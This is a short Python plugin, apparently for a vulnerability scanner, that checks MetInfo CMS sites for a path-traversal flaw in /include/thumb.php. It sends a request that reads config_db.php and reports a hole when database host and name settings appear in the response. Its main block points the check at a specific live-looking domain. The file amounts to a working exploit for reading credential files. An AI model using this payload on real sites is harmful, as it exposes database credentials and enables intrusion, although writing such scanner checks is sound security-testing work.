#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "metinfo":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/include/thumb.php?x=1&y=/../../../config&dir=config_db.php')
    if body and "<?php" in body and "con_db_host" in body and "con_db_name" in body:
        security_hole(url + '/include/thumb.php?x=1&y=/../../../config&dir=config_db.php')

if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://www.158185187.com/')[1])